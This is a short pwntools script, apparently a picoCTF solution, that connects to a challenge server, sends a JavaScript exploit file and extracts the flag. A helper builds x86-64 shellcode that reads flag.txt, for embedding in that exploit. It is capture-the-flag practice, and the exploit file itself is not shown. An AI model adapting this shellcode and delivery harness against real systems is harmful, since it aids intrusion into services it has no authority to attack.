#!/usr/bin/env python3

from pwn import *

context.clear(arch="amd64", os="linux")


def conn():
    if args.LOCAL:
        r = process(["python3", "server.py"])
    else:
        r = remote("wily-courier.picoctf.net", 56545)

    return r


# Helper function to print the shellcode for
# "exploit.js" as a list of hex values
def print_list_shellcode() -> list[int]:
    sc = asm(shellcraft.cat('flag.txt') + shellcraft.exit_group(0))

    l = [
        int.from_bytes(sc[i:i+4], 'little')
        for i in range(0, len(sc), 4)
    ]

    print("[" + ", ".join(hex(x) for x in l) + "]")


def main():
    # print_list_shellcode()

    r = conn()

    with open("exploit.js", "rb") as f:
        exploit = f.read()

        r.sendlineafter(b'5k:', str(len(exploit)).encode())
        r.sendlineafter(b'please!!\n', exploit)

        r.recvuntil(b"Stdout b'")
        flag = r.recvuntil(b"\\")[:-1]
        log.success(f"Flag: {flag.decode()}")


if __name__ == "__main__":
    main()
